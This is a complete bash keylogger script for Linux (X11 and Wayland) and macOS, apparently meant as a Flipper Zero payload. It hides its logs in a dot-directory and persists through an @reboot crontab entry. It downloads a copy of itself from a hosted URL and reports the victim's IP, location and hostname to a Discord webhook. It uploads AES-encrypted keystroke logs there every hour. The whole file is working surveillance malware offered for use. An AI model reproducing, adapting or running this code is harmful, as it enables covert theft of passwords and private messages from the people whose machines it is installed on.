#!/bin/bash
####################################################################################################
# Title       : Keylogger Unix
# Version     : 2.0
# Author      : I am TBJr
# Description : Keystroke logger for Linux (X11) with AES encryption and optional Discord exfil
#
# Platform notes:
#   Linux X11  — captures all keyboard input via xinput (no root needed)
#   Linux Wayland — requires root to read /dev/input/event*; exits with instructions if not root
#   macOS      — requires Accessibility permissions for CGEventTap; exits with instructions if absent
####################################################################################################

# --- Configuration -----------------------------------------------------------
DISCORD_WEBHOOK="REPLACE_ME"   # Discord webhook URL (leave REPLACE_ME to disable upload)
FLUSH_SECS=30                  # Seconds between flushing keystroke buffer to disk
UPLOAD_SECS=3600               # Seconds between encrypted log uploads to Discord
KILLSWITCH_DATE="2027-01-01"   # Script self-destructs after this date (YYYY-MM-DD)
KEY="MyS3cr3tK3y12345"
PRANK_ID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null | tr -d '-' | cut -c1-8 | tr '[:lower:]' '[:upper:]' \
  || uuidgen 2>/dev/null | tr -d '-' | cut -c1-8 | tr '[:lower:]' '[:upper:]' \
  || printf '%08X' $((RANDOM * RANDOM)))
TARGET_ALIAS=$(hostname)
# -----------------------------------------------------------------------------

OS_TYPE=$(uname)
LOG_DIR="$HOME/.local/share/.sysd"
mkdir -p "$LOG_DIR"

# Generate a UUID without relying on uuidgen (not on all distros)
function make_uuid() {
  if [[ -r /proc/sys/kernel/random/uuid ]]; then
    cat /proc/sys/kernel/random/uuid | tr -d '-'
  elif command -v uuidgen &>/dev/null; then
    uuidgen | tr -d '-'
  else
    printf '%08x%04x%04x%04x%012x' \
      $RANDOM $RANDOM $RANDOM $RANDOM $((RANDOM * RANDOM * RANDOM))
  fi
}

LOGFILE="$LOG_DIR/.dump-$(make_uuid | cut -c1-8)"
ENCRYPTED_LOG="$LOGFILE.enc"

# ---------------------------------------------------------------------------
# Cross-platform killswitch date check
# ---------------------------------------------------------------------------
function past_killswitch() {
  local NOW
  if [[ "$OS_TYPE" == "Darwin" ]]; then
    NOW=$(date -j -f "%Y-%m-%d" "$KILLSWITCH_DATE" "+%s" 2>/dev/null)
  else
    NOW=$(date -d "$KILLSWITCH_DATE" "+%s" 2>/dev/null)
  fi
  [[ -n "$NOW" && $(date +%s) -ge $NOW ]]
}

if past_killswitch; then
  rm -f "$LOGFILE" "$ENCRYPTED_LOG"
  crontab -l 2>/dev/null | grep -v '.kl_start.sh' | crontab - 2>/dev/null
  exit 0
fi

# ---------------------------------------------------------------------------
# Save this script to disk so crontab persistence has a real file path.
# When running via  bash -c "$(curl ...)"  there is no source file, so we
# download a fresh copy.  $0 being "bash" is the tell.
# ---------------------------------------------------------------------------
SELF_PATH="$LOG_DIR/.kl_runner.sh"
if [[ "$0" != "$SELF_PATH" ]]; then
  if [[ -f "$0" && "$0" != "bash" && "$0" != "-bash" ]]; then
    cp "$0" "$SELF_PATH"
  else
    curl -fsSL --max-time 10 \
      "https://tbjr.github.io/Flipper-payloads/host/keylogger_unix.sh" \
      -o "$SELF_PATH" 2>/dev/null
  fi
  chmod +x "$SELF_PATH" 2>/dev/null
fi

# Write starter script referenced by crontab
KL_START="$LOG_DIR/.kl_start.sh"
cat > "$KL_START" <<EOF
#!/bin/bash
bash "$SELF_PATH" &
EOF
chmod +x "$KL_START"

# Install crontab entry (deduplicated)
(crontab -l 2>/dev/null; echo "@reboot bash \"$KL_START\"") \
  | sort -u | crontab - 2>/dev/null

# ---------------------------------------------------------------------------
# Session-start ping — fires once when the logger starts; skipped if no webhook
# ---------------------------------------------------------------------------
function send_session_start() {
  [[ "$DISCORD_WEBHOOK" == "REPLACE_ME" ]] && return
  local GEO_JSON
  GEO_JSON=$(curl -fsSL --max-time 5 "https://ipwho.is/" 2>/dev/null)
  local IP CITY REGION COUNTRY ISP
  IP=$(echo      "$GEO_JSON" | grep -oP '"ip"\s*:\s*"\K[^"]+')
  CITY=$(echo    "$GEO_JSON" | grep -oP '"city"\s*:\s*"\K[^"]+')
  REGION=$(echo  "$GEO_JSON" | grep -oP '"region"\s*:\s*"\K[^"]+')
  COUNTRY=$(echo "$GEO_JSON" | grep -oP '"country"\s*:\s*"\K[^"]+')
  ISP=$(echo     "$GEO_JSON" | grep -oP '"isp"\s*:\s*"\K[^"]+')
  [[ -z "$IP" ]]  && IP="unknown"
  [[ -z "$CITY" ]] && CITY="Unknown"

  local TS
  TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ" 2>/dev/null || date "+%Y-%m-%dT%H:%M:%SZ")

  local JSON
  JSON=$(printf '{
  "username": "KeylogBot",
  "content": "🎯 **Session started** | ID: `%s`",
  "embeds": [{
    "title": "Keylogger Session",
    "color": 10181046,
    "fields": [
      {"name":"Prank ID","value":"%s","inline":true},
      {"name":"Target",  "value":"%s","inline":true},
      {"name":"OS",      "value":"%s","inline":true},
      {"name":"IP",      "value":"%s","inline":true},
      {"name":"Location","value":"%s, %s, %s","inline":false},
      {"name":"ISP",     "value":"%s","inline":true}
    ],
    "footer":{"text":"Keylogger Unix v2.0 by TBJr"},
    "timestamp":"%s"
  }]
}' "$PRANK_ID" "$PRANK_ID" "$TARGET_ALIAS" "$OS_TYPE" \
   "$IP" "$CITY" "$REGION" "$COUNTRY" "$ISP" "$TS")

  curl -fsSL --max-time 10 \
    -H "Content-Type: application/json" \
    -d "$JSON" \
    "$DISCORD_WEBHOOK" >/dev/null 2>&1
}

# ---------------------------------------------------------------------------
# Encryption helper — creates a new IV per chunk; appends to the log file.
# -pbkdf2 is required on OpenSSL 3.x (default on Ubuntu 22.04+).
# ---------------------------------------------------------------------------
function encrypt_and_append() {
  local plaintext_file="$1"
  [[ -f "$plaintext_file" && -s "$plaintext_file" ]] || return
  openssl enc -aes-128-cbc -salt -pbkdf2 \
    -in "$plaintext_file" -out "$ENCRYPTED_LOG" \
    -pass pass:"$KEY" 2>/dev/null
  rm -f "$plaintext_file"
}

# ---------------------------------------------------------------------------
# Upload encrypted log to Discord
# ---------------------------------------------------------------------------
function upload_log() {
  [[ "$DISCORD_WEBHOOK" == "REPLACE_ME" ]] && return
  [[ -f "$ENCRYPTED_LOG" ]] || return
  curl -fsSL --max-time 15 \
    -F "file=@$ENCRYPTED_LOG" \
    "$DISCORD_WEBHOOK" >/dev/null 2>&1
  rm -f "$ENCRYPTED_LOG"
}

# ---------------------------------------------------------------------------
# Linux X11 keylogger — uses xinput test, no root required.
# Maps X11 keycodes to symbols at runtime via xmodmap.
# ---------------------------------------------------------------------------
function start_x11_logger() {
  if ! command -v xinput &>/dev/null; then
    echo "[keylogger] xinput not found. Install x11-utils (Debian) or xorg-xinput (Arch)." >&2
    return 1
  fi
  if [[ -z "$DISPLAY" ]]; then
    echo "[keylogger] \$DISPLAY not set — not running under X11." >&2
    return 1
  fi

  # Find the first physical keyboard device (skip virtual/power/consumer keyboards)
  local KBD_ID
  KBD_ID=$(xinput list 2>/dev/null \
    | grep -iE 'keyboard' \
    | grep -viE 'virtual|consumer|media|power|button' \
    | grep -oP 'id=\K[0-9]+' \
    | head -1)

  if [[ -z "$KBD_ID" ]]; then
    echo "[keylogger] No physical keyboard device found via xinput." >&2
    return 1
  fi

  # Build a keycode->symbol map from xmodmap so output is human-readable
  declare -A KEYMAP
  while IFS= read -r line; do
    local kc sym
    kc=$(echo "$line" | awk '{print $2}')
    sym=$(echo "$line" | awk '{print $3}')
    # Only store single printable characters (skip NoSymbol, multi-char names)
    if [[ ${#sym} -eq 1 ]]; then
      KEYMAP[$kc]="$sym"
    fi
  done < <(xmodmap -pke 2>/dev/null)

  # Special named keys to log as readable tokens
  KEYMAP[9]="[ESC]"; KEYMAP[22]="[BS]"; KEYMAP[23]="[TAB]"
  KEYMAP[36]="[ENTER]"; KEYMAP[104]="[ENTER]"; KEYMAP[119]="[DEL]"
  KEYMAP[65]=" "  # space bar

  local BUFFER=""
  local LAST_FLUSH=$SECONDS
  local LAST_UPLOAD=$SECONDS

  # xinput test streams one event per line; we only care about key-press lines
  xinput test "$KBD_ID" 2>/dev/null | while IFS= read -r event; do
    if [[ "$event" =~ ^key\ press ]]; then
      local kc
      kc=$(echo "$event" | grep -oP '[0-9]+$')
      local ch="${KEYMAP[$kc]:-}"
      [[ -n "$ch" ]] && BUFFER+="$ch"
    fi

    if (( SECONDS - LAST_FLUSH >= FLUSH_SECS )) && [[ -n "$BUFFER" ]]; then
      local tmp
      tmp=$(mktemp "$LOG_DIR/.buf-XXXXXX")
      printf '%s' "$BUFFER" > "$tmp"
      encrypt_and_append "$tmp"
      BUFFER=""
      LAST_FLUSH=$SECONDS
    fi

    if (( SECONDS - LAST_UPLOAD >= UPLOAD_SECS )); then
      upload_log
      LAST_UPLOAD=$SECONDS
    fi
  done
}

# ---------------------------------------------------------------------------
# Linux Wayland keylogger — reads raw input events; requires root.
# ---------------------------------------------------------------------------
function start_wayland_logger() {
  if [[ $EUID -ne 0 ]]; then
    echo "[keylogger] Wayland detected. Reading /dev/input requires root." >&2
    echo "[keylogger] Re-run with sudo, or switch to an X11 session." >&2
    return 1
  fi

  # Find keyboard event device
  local KBD_DEV
  KBD_DEV=$(grep -rl 'EV=.*120013' /sys/class/input/*/capabilities/ev 2>/dev/null \
    | head -1 | sed 's|/sys/class/input/\(event[0-9]*\)/.*|/dev/input/\1|')

  if [[ -z "$KBD_DEV" ]]; then
    echo "[keylogger] Could not locate keyboard event device." >&2
    return 1
  fi

  # evtest gives structured output; cat + hexdump works but is harder to parse
  if command -v evtest &>/dev/null; then
    evtest "$KBD_DEV" 2>/dev/null | grep -oP '(?<=KEY_)\w+' >> "$LOGFILE" &
  else
    cat "$KBD_DEV" | hexdump -e '16/1 "%02x " "\n"' >> "$LOGFILE" &
  fi
}

# ---------------------------------------------------------------------------
# macOS keylogger — requires Accessibility permissions for any user-space
# keystroke capture.  There is no shell-native CGEventTap.  We check for
# the permission and instruct the user rather than silently doing nothing.
# ---------------------------------------------------------------------------
function start_macos_logger() {
  # Check if Terminal (or the launching app) has Accessibility access
  if ! osascript -e 'tell application "System Events" to keystroke ""' &>/dev/null 2>&1; then
    echo "[keylogger] Accessibility permission not granted." >&2
    echo "[keylogger] Go to: System Settings > Privacy & Security > Accessibility" >&2
    echo "[keylogger] Add Terminal (or your shell app) to the allowed list, then re-run." >&2
    return 1
  fi

  # With accessibility granted, use a Python CGEventTap if Python3 + pyobjc is present
  if command -v python3 &>/dev/null && python3 -c "import Quartz" 2>/dev/null; then
    python3 - "$LOGFILE" <<'PYEOF' &
import sys, signal, Quartz, AppKit

log_path = sys.argv[1]

def callback(proxy, event_type, event, refcon):
    if event_type == Quartz.kCGEventKeyDown:
        kc = Quartz.CGEventGetIntegerValueField(event, Quartz.kCGKeyboardEventKeycode)
        ch = AppKit.NSEvent.eventWithCGEvent_(event).characters()
        if ch:
            with open(log_path, 'a') as f:
                f.write(ch)
    return event

mask = (1 << Quartz.kCGEventKeyDown)
tap  = Quartz.CGEventTapCreate(
    Quartz.kCGSessionEventTap,
    Quartz.kCGHeadInsertEventTap,
    Quartz.kCGEventTapOptionListenOnly,
    mask, callback, None)

if not tap:
    sys.exit(1)

loop_src = Quartz.CFMachPortCreateRunLoopSource(None, tap, 0)
Quartz.CFRunLoopAddSource(Quartz.CFRunLoopGetCurrent(), loop_src, Quartz.kCFRunLoopDefaultMode)
Quartz.CGEventTapEnable(tap, True)
Quartz.CFRunLoopRun()
PYEOF
  else
    echo "[keylogger] python3 + pyobjc (Quartz) required for macOS keylogging." >&2
    echo "[keylogger] Install with: pip3 install pyobjc" >&2
    return 1
  fi
}

send_session_start

# ---------------------------------------------------------------------------
# Dispatch to the right logger for this platform
# ---------------------------------------------------------------------------
case "$OS_TYPE" in
  Darwin)
    start_macos_logger || exit 1
    ;;
  Linux)
    if [[ -n "$WAYLAND_DISPLAY" ]]; then
      start_wayland_logger || exit 1
    else
      start_x11_logger || exit 1
    fi
    ;;
  *)
    echo "[keylogger] Unsupported platform: $OS_TYPE" >&2
    exit 1
    ;;
esac

# ---------------------------------------------------------------------------
# Background monitor: flush + upload on schedule, honour killswitch
# ---------------------------------------------------------------------------
while true; do
  sleep "$FLUSH_SECS"
  past_killswitch && {
    rm -f "$LOGFILE" "$ENCRYPTED_LOG"
    crontab -l 2>/dev/null | grep -v '.kl_start.sh' | crontab - 2>/dev/null
    exit 0
  }
  [[ -f "$LOGFILE" && -s "$LOGFILE" ]] && encrypt_and_append "$LOGFILE"
  upload_log
done
